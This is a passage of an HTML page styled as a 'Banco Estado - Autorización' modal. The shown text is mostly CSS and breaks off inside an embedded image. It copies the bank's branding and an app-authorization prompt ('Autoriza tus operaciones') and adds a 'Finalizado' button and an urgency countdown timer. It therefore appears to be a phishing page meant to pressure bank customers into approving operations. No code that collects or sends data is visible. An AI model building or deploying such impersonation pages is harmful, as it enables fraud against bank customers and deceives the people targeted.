<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado - Autorización</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: rgba(0,0,0,0.5);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            padding: 36px 30px 30px;
            text-align: center;
            box-shadow: 0 24px 70px rgba(0,0,0,0.28);
        }

        /* ── Fila de iconos superiores ── */
        .icons-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-bottom: 24px;
        }

        /* Candado verde */
        .lock-wrap {
            width: 64px;
            height: 64px;
            background: #3db54a;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            box-shadow: 0 4px 12px rgba(61,181,74,0.3);
        }
        .lock-wrap svg {
            width: 36px;
            height: 36px;
            fill: white;
        }

        /* Puntos animados */
        .dots-loader {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #f0a500;
            animation: dotBounce 1.3s ease-in-out infinite;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.22s; }
        .dot:nth-child(3) { animation-delay: 0.44s; }

        @keyframes dotBounce {
            0%, 60%, 100% { transform: scale(0.65); opacity: 0.35; }
            30% { transform: scale(1.2); opacity: 1; }
        }

        /* Celular CSS */
        .phone-wrap {
            width: 44px;
            height: 64px;
            background: #2c2c2c;
            border-radius: 8px 8px 7px 7px;
            position: relative;
            flex-shrink: 0;
            box-shadow: 0 3px 8px rgba(0,0,0,0.35);
        }
        /* cámara frontal */
        .phone-wrap::before {
            content: '';
            position: absolute;
            top: 5px;
            left: 50%;
            transform: translateX(-50%);
            width: 8px;
            height: 3px;
            background: #555;
            border-radius: 2px;
            z-index: 2;
        }
        /* botón home */
        .phone-wrap::after {
            content: '';
            position: absolute;
            bottom: 4px;
            left: 50%;
            transform: translateX(-50%);
            width: 12px;
            height: 4px;
            background: #444;
            border-radius: 2px;
        }
        .phone-screen {
            position: absolute;
            top: 12px;
            left: 3px;
            right: 3px;
            bottom: 12px;
            background: linear-gradient(160deg, #1e3a5f 0%, #0d2240 100%);
            border-radius: 3px;
            overflow: hidden;
        }
        /* pequeña barra de status en pantalla */
        .phone-screen::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 5px;
            background: rgba(255,255,255,0.08);
        }

        /* ── Texto principal ── */
        .main-text {
            font-size: 16px;
            font-weight: 600;
            color: #1a1a2e;
            line-height: 1.5;
            margin-bottom: 22px;
            max-width: 290px;
            margin-left: auto;
            margin-right: auto;
        }

        /* ── Mockup celular (imagen central) ── */
        .phone-mockup-wrap {
            margin: 0 auto 24px;
            width: 200px;
        }

        /* Marco del teléfono */
        .phone-frame {
            width: 200px;
            height: 148px;
            background: #1c1c1e;
            border-radius: 20px;
            padding: 6px 5px;
            position: relative;
            box-shadow: 0 8px 24px rgba(0,0,0,0.25), inset 0 0 0 1px rgba(255,255,255,0.06);
        }
        /* notch */
        .phone-frame::before {
            content: '';
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 6px;
            background: #1c1c1e;
            border-radius: 0 0 8px 8px;
            z-index: 2;
        }
        /* botón lateral */
        .phone-frame::after {
            content: '';
            position: absolute;
            right: -3px;
            top: 30px;
            width: 3px;
            height: 20px;
            background: #333;
            border-radius: 0 2px 2px 0;
        }

        /* Pantalla del mockup */
        .mockup-screen {
            width: 100%;
            height: 100%;
            background: linear-gradient(170deg, #c94d0a 0%, #9e3a05 100%);
            border-radius: 15px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            padding: 8px 8px 7px;
            gap: 5px;
        }

        /* Barra "Autoriza tus operaciones" */
        .mockup-notify-bar {
            background: rgba(255,255,255,0.16);
            border-radius: 7px;
            padding: 6px 9px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .mockup-notify-left {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .mockup-app-icon {
            width: 18px;
            height: 18px;
            background: rgba(255,255,255,0.22);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .mockup-notify-text {
            font-size: 7.5px;
            font-weight: 700;
            color: rgba(255,255,255,0.95);
            letter-spacing: 0.1px;
        }
        .mockup-notify-arrow {
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            line-height: 1;
        }

        /* Accesos rápidos */
        .mockup-section-label {
            font-size: 6px;
            color: rgba(255,255,255,0.55);
            text-align: left;
            padding-left: 2px;
            letter-spacing: 0.3px;
        }

        .mockup-quick-access {
            display: flex;
            justify-content: space-between;
            padding: 0 2px;
            flex: 1;
            align-items: center;
        }

        .qa-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            flex: 1;
        }

        .qa-circle {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qa-circle.red-c { background: #d93025; }
        .qa-circle.gray-c { background: rgba(0,0,0,0.28); }

        .qa-label {
            font-size: 5.5px;
            color: rgba(255,255,255,0.78);
            text-align: center;
            line-height: 1.25;
            max-width: 34px;
        }

        /* ── Botón Finalizado ── */
        .form-finalizado {
            margin-bottom: 16px;
        }

        .finalizado-btn {
            width: 100%;
            padding: 15px;
            background: #0257a0;
            color: white;
            font-size: 16px;
            font-weight: 700;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.15s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 14px rgba(2,87,160,0.35);
            letter-spacing: 0.3px;
        }
        .finalizado-btn:hover {
            background: #01468a;
            box-shadow: 0 6px 18px rgba(2,87,160,0.45);
            transform: translateY(-1px);
        }
        .finalizado-btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(2,87,160,0.3);
        }

        /* ── Contador ── */
        .timer-container {
            background: #f2f4f6;
            border-radius: 10px;
            padding: 13px 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        .timer-label {
            font-size: 15px;
            color: #555;
            font-weight: 400;
        }
        .timer-value {
            font-size: 17px;
            font-weight: 800;
            color: #1a1a2e;
            letter-spacing: 0.5px;
            min-width: 36px;
            transition: color 0.3s;
        }
        .timer-value.urgent { color: #d93025; }

        /* Imagen candado */
        .lock-img {
            width: 64px;
            height: 64px;
            object-fit: contain;
            flex-shrink: 0;
        }

        /* ── Responsive ── */
        @media (max-width: 420px) {
            .modal { padding: 28px 20px 24px; }
            .main-text { font-size: 15px; }
            .lock-wrap { width: 56px; height: 56px; border-radius: 14px; }
            .lock-wrap svg { width: 30px; height: 30px; }
            .phone-wrap { width: 38px; height: 56px; }
            .phone-frame { width: 178px; height: 132px; }
            .phone-mockup-wrap { width: 178px; }
        }
    </style>
</head>
<body>
<div class="modal">

    <!-- Fila iconos: candado · puntos · celular -->
    <div class="icons-row">
        <img src="data:image/png;base64,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